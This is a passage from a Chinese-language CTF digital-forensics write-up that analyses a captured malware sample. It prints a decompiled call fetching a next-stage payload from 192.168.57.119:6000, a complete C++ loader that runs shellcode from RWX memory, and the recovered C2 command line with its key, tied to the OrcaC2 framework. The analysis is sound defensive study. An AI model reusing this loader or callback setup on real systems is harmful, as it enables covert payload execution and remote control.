<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">sub_7E13E0</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">"192.168.57.119"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">6000</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"files/1730391917.bin"</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>这就是下载下一阶段载荷的语句，并且这与 <code>challenge.pcapng</code> 流量数据相吻合</p>
<p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241131-173122-1deb65bf12be0056b47b1bfccc0c40e6.png" width="2014" height="1541" class="img_ev3q"></p>
<p>跟进流量包，此部分执行之后肯定会执行回连操作</p>
<p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241132-173220-ef4853e4b085eda7668d0cbc48bb4cca.png" width="1950" height="1543" class="img_ev3q"></p>
<p>基于此即可确定回连地址</p>
<div class="language-flag codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-flag codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">1. 192.168.57.119:6000</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task11">task11<a href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/blog/2024qwbs8%20Master%20of%20DFIR#task11" class="hash-link" aria-label="task11的直接链接" title="task11的直接链接">​</a></h3>
<blockquote>
<ol>
<li>攻击者所使用最终阶段载荷所使用的加密算法是什么? 示例: DES</li>
</ol>
</blockquote>
<p>首先，需要从 <code>pacpng</code> 文件中，将 <code>1730391917.bin</code> 文件 dump 出来</p>
<p>使用 Shellcode Loader 加载 <code>1730391917.bin</code> 文件</p>
<div class="theme-admonition theme-admonition-warning admonition_xJq3 alert alert--warning"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 16 16"><path fill-rule="evenodd" d="M8.893 1.5c-.183-.31-.52-.5-.887-.5s-.703.19-.886.5L.138 13.499a.98.98 0 0 0 0 1.001c.193.31.53.501.886.501h13.964c.367 0 .704-.19.877-.5a1.03 1.03 0 0 0 .01-1.002L8.893 1.5zm.133 11.497H6.987v-2.003h2.039v2.003zm0-3.004H6.987V5.987h2.039v4.006z"></path></svg></span>注意</div><div class="admonitionContent_BuS1"><p>这份代码需要使用 Visual Studio 来编译</p><p>g++ 编译会出现内存访问非法的问题</p></div></div>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>信息</div><div class="admonitionContent_BuS1"><p>亦可以使用 <a href="https://github.com/volexity/donut-decryptor" target="_blank" rel="noopener noreferrer">volexity/donut-decryptor: Retrieve inner payloads from Donut samples</a> 进行静态提取</p></div></div>
<div class="language-cpp codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-cpp codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">include</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property string" style="color:#e3116c">&lt;windows.h&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">include</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property string" style="color:#e3116c">&lt;iostream&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">include</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property string" style="color:#e3116c">&lt;fstream&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">include</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property string" style="color:#e3116c">&lt;vector&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">main</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token comment" style="color:#999988;font-style:italic">// 输入文件名</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    std</span><span class="token double-colon punctuation" style="color:#393A34">::</span><span class="token plain">string filename</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    std</span><span class="token double-colon punctuation" style="color:#393A34">::</span><span class="token plain">cout </span><span class="token operator" style="color:#393A34">&lt;&lt;</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"Enter the shellcode filename:"</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    std</span><span class="token double-colon punctuation" style="color:#393A34">::</span><span class="token plain">cin </span><span class="token operator" style="color:#393A34">&gt;&gt;</span><span class="token plain"> filename</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token comment" style="color:#999988;font-style:italic">// 打开文件 1.bin，读取 shellcode</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    std</span><span class="token double-colon punctuation" style="color:#393A34">::</span><span class="token plain">ifstream </span><span class="token function" style="color:#d73a49">file</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">filename</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> std</span><span class="token double-colon punctuation" style="color:#393A34">::</span><span class="token plain">ios</span><span class="token double-colon punctuation" style="color:#393A34">::</span><span class="token plain">binary </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> std</span><span class="token double-colon punctuation" style="color:#393A34">::</span><span class="token plain">ios</span><span class="token double-colon punctuation" style="color:#393A34">::</span><span class="token plain">ate</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">!</span><span class="token plain">file</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">is_open</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        std</span><span class="token double-colon punctuation" style="color:#393A34">::</span><span class="token plain">cerr </span><span class="token operator" style="color:#393A34">&lt;&lt;</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"Failed to open shellcode file!"</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&lt;&lt;</span><span class="token plain"> std</span><span class="token double-colon punctuation" style="color:#393A34">::</span><span class="token plain">endl</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token comment" style="color:#999988;font-style:italic">// 获取文件大小，并读取内容到 buffer 中</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    std</span><span class="token double-colon punctuation" style="color:#393A34">::</span><span class="token plain">streamsize size </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> file</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">tellg</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    file</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">seekg</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> std</span><span class="token double-colon punctuation" style="color:#393A34">::</span><span class="token plain">ios</span><span class="token double-colon punctuation" style="color:#393A34">::</span><span class="token plain">beg</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    std</span><span class="token double-colon punctuation" style="color:#393A34">::</span><span class="token plain">vector</span><span class="token operator" style="color:#393A34">&lt;</span><span class="token keyword" style="color:#00009f">unsigned</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">char</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">shellcode</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">size</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">!</span><span class="token plain">file</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">read</span><span class="token punctuation" style="color:#393A34">(</span><span class="token generic-function function" style="color:#d73a49">reinterpret_cast</span><span class="token generic-function generic class-name operator" style="color:#393A34">&lt;</span><span class="token generic-function generic class-name keyword" style="color:#00009f">char</span><span class="token generic-function generic class-name"> </span><span class="token generic-function generic class-name operator" style="color:#393A34">*</span><span class="token generic-function generic class-name operator" style="color:#393A34">&gt;</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">shellcode</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">data</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> size</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        std</span><span class="token double-colon punctuation" style="color:#393A34">::</span><span class="token plain">cerr </span><span class="token operator" style="color:#393A34">&lt;&lt;</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"Failed to read shellcode file!"</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&lt;&lt;</span><span class="token plain"> std</span><span class="token double-colon punctuation" style="color:#393A34">::</span><span class="token plain">endl</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    file</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">close</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token comment" style="color:#999988;font-style:italic">// 分配内存，设置为可执行、可写和可读</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">void</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain">execMem </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">VirtualAlloc</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">                </span><span class="token comment" style="color:#999988;font-style:italic">// 自动选择分配地址</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        shellcode</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">size</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 分配的大小</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        MEM_COMMIT </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> MEM_RESERVE</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        PAGE_EXECUTE_READWRITE </span><span class="token comment" style="color:#999988;font-style:italic">// 设置页属性为可执行</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">execMem </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token constant" style="color:#36acaa">NULL</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        std</span><span class="token double-colon punctuation" style="color:#393A34">::</span><span class="token plain">cerr </span><span class="token operator" style="color:#393A34">&lt;&lt;</span><span class="token string" style="color:#e3116c">"VirtualAlloc failed:"</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&lt;&lt;</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">GetLastError</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&lt;&lt;</span><span class="token plain"> std</span><span class="token double-colon punctuation" style="color:#393A34">::</span><span class="token plain">endl</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token comment" style="color:#999988;font-style:italic">// 将 shellcode 复制到分配的内存</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">memcpy</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">execMem</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> shellcode</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">data</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> shellcode</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">size</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token comment" style="color:#999988;font-style:italic">// 创建一个函数指针，指向 shellcode</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">auto</span><span class="token plain"> shellcodeFunc </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token generic-function function" style="color:#d73a49">reinterpret_cast</span><span class="token generic-function generic class-name operator" style="color:#393A34">&lt;</span><span class="token generic-function generic class-name keyword" style="color:#00009f">void</span><span class="token generic-function generic class-name"> </span><span class="token generic-function generic class-name punctuation" style="color:#393A34">(</span><span class="token generic-function generic class-name operator" style="color:#393A34">*</span><span class="token generic-function generic class-name punctuation" style="color:#393A34">)</span><span class="token generic-function generic class-name punctuation" style="color:#393A34">(</span><span class="token generic-function generic class-name punctuation" style="color:#393A34">)</span><span class="token generic-function generic class-name operator" style="color:#393A34">&gt;</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">execMem</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token comment" style="color:#999988;font-style:italic">// 执行 shellcode</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    std</span><span class="token double-colon punctuation" style="color:#393A34">::</span><span class="token plain">cout </span><span class="token operator" style="color:#393A34">&lt;&lt;</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"Executing shellcode..."</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&lt;&lt;</span><span class="token plain"> std</span><span class="token double-colon punctuation" style="color:#393A34">::</span><span class="token plain">endl</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">shellcodeFunc</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 执行 shellcode</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token comment" style="color:#999988;font-style:italic">// 释放分配的内存</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">VirtualFree</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">execMem</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> MEM_RELEASE</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>并且使用 <code>x64debug</code> 进行调试</p>
<p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241149-214908-b4678f7e96a3f6a2287a63dfd880d6c7.png" width="2130" height="1600" class="img_ev3q"></p>
<p>当 Shellcode 加载到内存并执行之后，对程序的内存空间扫描字符串，可以发现</p>
<p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241144-224422-54ee5fbf1e34b3728bc1ea5e5aa94c88.png" width="1740" height="1247" class="img_ev3q"></p>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">pmseindw -host=192.168.57.119:6000 -key=pJB`-v)t^ZAsP$|r</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>根据 key 的长度，以及程序本身的流量包</p>
<p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241147-224711-3c4402722c32bcbe381ab69cf374e0d7.png" width="1711" height="1436" class="img_ev3q"></p>
<p>定位到 <a href="https://github.com/Ptkatz/OrcaC2" target="_blank" rel="noopener noreferrer">Ptkatz/OrcaC2: OrcaC2 是一款基于 Websocket 加密通信的多功能 C&amp;C 框架，使用 Golang 实现</a></p>
<p>可以确定加密算法为 <code>AES</code></p>
<div class="language-flag codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-flag codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">1. AES</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task12">task12<a href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/blog/2024qwbs8%20Master%20of%20DFIR#task12" class="hash-link" aria-label="task12的直接链接" title="task12的直接链接">​</a></h3>
<blockquote>
<ol>
<li>攻击者所使用最终阶段载荷所使用的密钥的 MD5 是什么? (注意: MD5(密钥内容), 以 cyberchef 的为准) 示例: 9b04d152845ec0a378394003c96da594</li>
</ol>
</blockquote>
<p>在上一题中，提取出来字符串</p>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">pmseindw -host=192.168.57.119:6000 -key=pJB`-v)t^ZAsP$|r</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>计算哈希</p>
